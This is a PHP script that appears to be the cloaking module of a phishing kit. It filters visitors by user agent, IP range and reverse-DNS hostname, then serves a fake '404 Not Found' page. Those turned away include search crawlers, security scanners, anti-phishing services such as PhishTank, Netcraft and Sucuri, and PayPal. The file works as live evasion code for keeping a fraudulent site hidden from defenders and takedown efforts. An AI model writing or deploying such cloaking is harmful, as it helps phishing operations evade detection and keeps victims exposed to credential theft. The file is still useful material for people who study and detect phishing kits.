<?php
include('bots/anti1.php');
include('bots/anti2.php');
include('bots/anti3.php');
include('bots/anti4.php');
include('bots/anti5.php');
include('bots/anti6.php');
include('bots/anti7.php');
include('bots/anti8.php');
include('bots/ant1.php');
include('bots/ant2.php');
include('bots/ant3.php');
include('bots/ant4.php');
include('bots/ant5.php');
include('bots/ant6.php');
include('bots/ant7.php');
include('bots/ant8.php');

function banbot(){
    header('HTTP/1.0 404 Not Found');die("<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>"); exit();};
function is_bot() {
    $spiders = array('NetcraftSurveyAgent', 'openintelligencedata', 'semanticdiscovery', 'GrapeshotCrawler', 'ia_archiver', 'PaperLiBot', 'Yahoo! Slurp', 'indexer', 'noyona', 'sitetech-rover', 'Baiduspider', 'snooper', 'outlook!', 'iron33', 'weblayers', 'acoonbot', 'rbot', 'architext', 'pbot', 'sift', 'spam', 'xenu', 'ferret', '(bot', 'pegasus', 'netresearchserver', 'dreamhost', 'suke', 'slurp', 'PycURL', 'udmsearch', 'pompos', 'sbot', 'iconsurf', 'MJ12bot', 'TencentTraveler', 'obot', 'nameprotect', 'sygol', 'road runner', 'snappy', 'javabee', 'dmoz', 'ivia', 'bradley', 'valkyrie', 'Rambler', 'scam', 'QuerySeekerSpider', 'magpie-crawler', 'picsearch', 'ezresult', 'atlocal', 'msn', 'larbin', 'a6-indexer', 'partnersite', 'theophrastus', 'mnogosearch', 'w3m2', 'heritrix', 'ncsa beta', 'delorie', 'gazz', 'yandex', 'sohu', 'araneo', 'surfnomore', '50.nu', 'genieknows', 'scoutjet', 'roadhouse', 'acoon', 'simmany', 'rules', 'R6_FeedFetcher', 'Ezooms', 'popular iconoclast', 'accoona', 'boitho', 'amazonaws', 'searchprocess', 'Exabot', 'gcreep', 'gromit', 'szukacz', 'vagabondo', 'phishing', 'grapnel', 'mercator', 'google', 'pioneer', 'kretrieve', 'ccubee', 'informant', 'zippp', 'phantom', 'webquest', 'websitepulse', 'page_verifier', 'mj12', 'netpilot', 'worldlight', '-bot', 'Twitterbot', 'pear.', 'mattie', 'analytics', 'merlinkbot', 'calif', 'lachesis', 'Feedly', 'bingbot', 'raven search', 'sidewinder', 'emacs-w3 search engine', 'UnwindFetchor', 'mbot', 'monster', 'internet shinchakubin', 'windows 95', 'acunetix', 'webmirror', 'supersnooper', 'walker', 'moget', 'download express', 'w3mir', 'csci', 'inspector web', 'web hopper', 'webcatcher', 'collective', 'jetbrains', 'ybot', 'arks', 't-rex', 'helix', 'mediafox', 'imagelock', 'python', 't-h-u-n-d-e-r-s-t-o-n-e', 'wallpaper', 'jabber', 'grokkit-crawler', 'ip3000', 'webreaper', 'microsoft url control', 'findlinks', 'softlayer', 'shark', 'titin', 'nzexplorer', 'xift', 'msnbot', 'YandexBot', 'Python-urllib', 'wanderer', 'ejupiter', 'sven', 'wavefire', 'bdfetch', 'zyborg', 'sna-', 'glx', 'ananzi', 'woriobot', 'YahooSeeker', '_bot', 'libwww', 'titan', 'patric', 'ebot', 'phishtank', 'blog', 'aranha', 'ebay', 'SMXCrawler', 'htdig', 'funnelweb', 'churl', 'spider', 'parasite', 'cassandra', '008', 'roach', 'dwcp', 'websnarf', 'peregrinator', 'merzscope', 'site valet', 'fireball', 'depspid', 'templeton', 'booch', 'salty', 'wwwster', 'twisted', 'whowhere', 'web core', 'xget', 'yeti', 'SearchmetricsBot', 'zao/', 'occam', 'echo blinde kuh', 'computingsite', 'newscan-online', 'esther', 'pinpoint', 'jetbot', 'html index', 'bot/', 'NetSeer crawler', 'volcano', 'PulseCrawler', 'muscatferret', 'Google', ':bot', 'bannana_bot', 'griffon', 'lycos', 'adressendeutschland', 'curl', 'jack', 'hubater', 'wild ferret', 'hbot', 'blaiz', 'hotmail!', 'rambler', 'ahrefsbot', 'poirot', 'magpie', 'fouineur', 'pack rat', 'nokia6682/', 'Yandex', 'orb search', '80legs.com/webcrawler', 'webwatch', 'inktomisearch.com', 'whizbang', 'myweb', 'deepindex', 'ichiro', 'incywincy', 'minirank', 'picosearch', 'Mediapartners-Google', 'tach black widow', 'piltdownman', 'senrigan', 'geturl', 'wauuu', 'biglotron', 'Spinn3r', 'tbot', 'atomz', 'w3c_validator', 'ebingbong', 'webmonkey', 'fish search', 'baypup', 'Butterfly', 'lbot', 'webzinger', "shai'hulud", 'wwwc', 'xirq', 'poppelsdorf', 'PercolateCrawler', 'cusco', 'havindex', 'cfetch', 'speedfind', 'admantx', 'pagebull', 'ibm_planetwide', 'Slurp', '360spider', 'MaxPointCrawler', 'hamahakki', 'webcopy', 'facebookexternalhit', 'vision-search', 'yanga', 'InAGist', 'weblinker', 'Kraken', 'homerweb', 'robofox', 'msn!', 'ahoy', 'multitext', 'twiceler', 'outlook', 'linkscan', 'aboundexbot', 'steeler/', 'netcarta webmap engine', 'nationaldirectory', 'ebiness', 'golem', 'weblog monitor', 'robozilla', 'openfind', 'phpdig', '/teoma', 'above', 'victoria', 'jakarta', 'dtaagent', 'cmc', 'TweetmemeBot', 'hotmail', 'image.kapsi.net', 'pageboy', 'falcon', 'toutatis', 'amznkassocbot', 'apercite', 'plumtreewebaccessor', 'getterroboplus', 'e-collector', 'pimptrain', 'MSNBot', '200pleasebot', 'deweb', 'spinner', 'psycheclone', 'Feedfetcher-Google', 'omni', 'dbot', 'grub', 'webvac', 'tarantula', '/bot', 'shopwiki', 'urlredirectresolver', 'felix ide', 'cyveillance', 'comagent', 'AhrefsBot', 'hku www octopus', 'alexabot', 'aportworm', 'muncher', 'search.', 'pogodak', 'apache-httpclient', 'kdd-explorer', 'ditto', 'kilroy', 'anthill', 'objectssearch', 'linkalarm', 'antbot', 'webstolperer', 'Y!J-BRW', 'docomo', 'accelobot', 'moose', 'bot.', 'url check', 'TweetedTimes Bot', 'aboutusbot', 'site searcher', 'pgp key agent', 'hyper-decontextualizer', 'Sogou web spider', 'seek', 'knowledge', 'legs', 'NING', 'zbot', 'urlresolver', 'panscient', 'open text', 'bjaaland', 'nomad', 'combine', 'htmlgobble', 'webwalk', '007ac9', 'fido', 'sphider', 'motor', 'yodao', 'tkwww', 'SISTRIX Crawler', 'miva', 'israeli-search', 'robbie', 'addthis.com', 'grabber', 'atn', 'tor-exit', 'iltrovatore', 'Googlebot', 'najdi', 'blackwidow', 'web wombat', 'webfoot', 'voyager/', 'crawler', 'calyxinstitute', 'poppi', 'abrave spider', 'netsparker', 'scrubby', 'netmechanic', 'PrintfulBot', 'BazQuxBot', 'asterias', 'kototoi', 'infobee', 'silk', 'die blinde kuh', 'charlotte', 'scooter', 'altavista', '.bot', 'webbandit', 'sbider', 'jumpstation', 'nec-meshexplorer', 'arachnophilia', 'webwombat', 'marvin/', 'intelliagent', 'html_analyzer', 'spbot', 'nederland.zoek', 'ShowyouBot', 'mediapartners', '4seohuntbot', 'aretha', 'sg-scout', 'lssrocketcrawler', 'abot', 'daumoa', 'lwp', 'arabot', 'lockon', 'nutch', 'netscoop', 'sphere', 'publisher', 'backrub', 'mwd.search', 'R6_CommentReader', 'fetchrover', 'bot', 'tutorgig', 'link validator', 'windows 98', 'kbot', 'labelgrabber', 'blo.', '192.comagent', 'arale', 'spyder', 'nhse', 'bloodhound', 'katipo', 'appie', 'nbot', 'smartwit', 'mon.itor.us', 'ingrid', 'evliya celebi', 'big brother', 'butterfly', 'digger', 'cienciaficcion', 'gulliver', 'nazilla', 'verticrawl', 'vbot', 'augurfind', 'goforit', 'harvest', 'ucsd', 'adsbot-google', 'osis-project', 'voyager-hc', 'crawl', 'piranha', 'suntek', 'updated', 'skymob.com', 'mapoftheinternet', 'ah-ha.com', 'wget', 'sleek', 'mantraagent', 'gralon', 'amagit.com');
	$d4 =  strtolower($_SERVER['HTTP_USER_AGENT']);
    foreach($spiders as $spider) {
        if ( stripos($_SERVER['HTTP_USER_AGENT'], $spider) !== false or $d4 == "" or $d4 == " " or $d4 =="	" or $d4 == '....') {return true;break;}
    }
    return false;
}
if (is_bot()) {banbot();exit();}

$IP_Connected = $_SERVER['REMOTE_ADDR'];
 $IP_Banned = array('185.28.20.243', '^64.106.213.*', '^89.138.*.*', '^66.207.120.*', '^50.7.*.*', '^158.108.*.*', '^67.15.*.*', '^93.172.*.*', '^74.125.*.*', '^212.235.*.*', '^185.28.20.*', '^69.61.12.*', '^198.54.*.*', '^216.239.32.*', '^72.14.192.*', '^212.150.*.*', '^66.249.*.*', '^198.25.*.*', '^209.85.*.*', '^192.115.134.*', '^194.90.*.*', '^212.143.*.*', '^62.90.*.*', '^167.24.*.*', '^64.18.*.*', '^202.108.252.*', '^217.16.26.*', '68.65.53.71', '^206.28.72.*', '^194.72.238.*', '^212.29.224.*', '^69.65.*.*', '^193.47.80.*', '^204.14.48.*', '^85.64.*.*', '^66.102.*.*', '^66.221.*.*', '^82.166.*.*', '^193.253.199.*', '^38.105.*.*', '^64.27.2.*', '^212.50.193.*', '^209.73.228.*', '^217.132.*.*', '^66.205.64.*', '^64.37.103.*', '^54.176.*.*', '^193.220.178.*', '^62.116.207.*', '217.16.26.166', '^212.29.192.*', '^168.188.*.*', '^85.250.*.*', '^50.97.*.*', '^38.144.36.*', '^173.194.*.*', '^131.212.*.*', '^184.173.*.*', '^192.118.48.*', '^12.148.196.*', '^207.126.144.*', '^194.52.68.*', '^64.124.14.*', '^38.100.*.*', '^208.65.144.*', '^67.209.128.*', '^109.186.*.*', '^64.233.160.*', '^54.228.218.*', '54.228.218.117', '^64.62.136.*', '^12.148.209.*', '^46.116.*.* ', '^149.20.*.*', '^107.170.*.*', '^64.62.175.*', '^209.85.128.*', '^66.150.14.*', '^216.252.167.*', '^128.242.*.*','^66.211.168.*','^66.211.169.*','^66.211.170.*','^66.211.171.*');
if(in_array($IP_Connected,$IP_Banned)){
	banbot();exit();
} else {
		foreach($IP_Banned as $ip) {
			if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
				banbot();exit();
			}
		}
	};
				
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array('cmu', 'netpilot', 'millersmiles', 'bot', 'crawler', 'siteadvisor', 'scanurl', 'crawl', 'ebay', 'phishtank', 'phishfighting', 'crime', 'websecurityguard', 'opendns', 'onlinelinkscan', 'sucuri.net', 'amazonaws', 'p3pwgdsn', 'paypal', 'messagelabs', 'stanford', 'internetdefence', '000webhost', 'mywot', 'netcraft', 'antiphishing', 'drweb', 'Dr.Web', 'phish', 'phishery', 'dreamhost', 'above', 'softlayer', 'torservers', 'calyxinstitute', 'cyveillance', 'trendmicro', 'sonicwall', 'gstatic', 'goo', 'hostinger', 'google', 'facebook', 'wikipedia', 'onguardonline', 'tor-exit', 'msnbot');
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
        banbot();exit();
    };
};

?>
